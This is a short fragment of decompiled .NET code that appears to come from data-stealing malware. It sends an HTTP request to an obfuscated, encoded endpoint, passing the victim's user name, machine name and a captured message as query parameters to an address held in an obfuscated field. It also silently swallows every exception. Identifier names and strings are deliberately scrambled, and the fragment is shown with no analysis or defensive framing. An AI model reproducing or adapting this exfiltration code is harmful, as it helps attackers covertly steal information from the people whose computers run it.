          HttpWebResponse response = (HttpWebResponse) WebRequest.Create(RUDUUFDP.CPMXFIPG("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False") + "?to=" + JNXOYT.WTINUEUL + "&subject=" + Strings.Replace(RUDUUFDP.CPMXFIPG("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + RUDUUFDP.CPMXFIPG("aQ0=", RUDUUFDP.CPMXFIPG("g7nP3cEJ", "False")) + Environment.MachineName.ToString(), " ", "%20") + "&message=" + Strings.Replace(Expression, " ", "%20") + "&from=" + JNXOYT.WTINUEUL).GetResponse();
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }
}
